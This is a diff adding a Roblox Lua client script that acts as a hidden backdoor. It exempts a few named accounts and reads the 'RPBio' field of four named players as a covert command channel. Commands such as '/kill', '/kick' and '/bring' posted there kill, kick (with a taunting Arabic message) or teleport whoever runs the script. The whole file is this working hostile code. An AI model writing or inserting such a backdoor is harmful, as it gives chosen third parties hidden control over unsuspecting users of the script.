@@ -1,0 +1,73 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local immuneLocals = {
+    Sajwaad = true,
+    ghalidev_0 = true,
+    DemoZ = true,
+    Daemon = true
+}
+
+if immuneLocals[LocalPlayer.Name] then
+    return
+end
+
+
+local monitoredPlayers = {
+    Sajwaad = true,
+    ghalidev_0 = true,
+    iskeowa = true,
+    yew99yew = true
+}
+
+local myNameLower = string.lower(LocalPlayer.Name)
+local myNamePrefix = string.sub(myNameLower, 1, 3)
+
+local function executeCommand(command, fromPlayer)
+    command = string.lower(command)
+
+    if command == "/kill all"
+    or (string.sub(command, 1, 5) == "/kill" and string.find(command, myNamePrefix, 6, true)) then
+        LocalPlayer.Character:BreakJoints()
+    end
+
+    if command == "/kick all"
+    or (string.sub(command, 1, 5) == "/kick" and string.find(command, myNamePrefix, 6, true)) then
+        LocalPlayer:Kick("تم طردك بواسطة عمك رامي")
+    end
+
+    if command == "/bring all"
+    or (string.sub(command, 1, 6) == "/bring" and string.find(command, myNamePrefix, 7, true)) then
+        if fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            char:WaitForChild("HumanoidRootPart").CFrame =
+                fromPlayer.Character.HumanoidRootPart.CFrame
+        end
+    end
+end
+
+local function monitorPlayer(player)
+    if not monitoredPlayers[player.Name] then return end
+    if player == LocalPlayer then return end
+
+    local bag = player:WaitForChild("PlayersBag", 10)
+    if not bag then return end
+
+    local bio = bag:WaitForChild("RPBio", 10)
+    if not bio or not bio:IsA("StringValue") then return end
+
+    executeCommand(bio.Value, player)
+
+    bio:GetPropertyChangedSignal("Value"):Connect(function()
+        executeCommand(bio.Value, player)
+    end)
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    monitorPlayer(plr)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    plr.CharacterAdded:Wait()
+    monitorPlayer(plr)
+end)
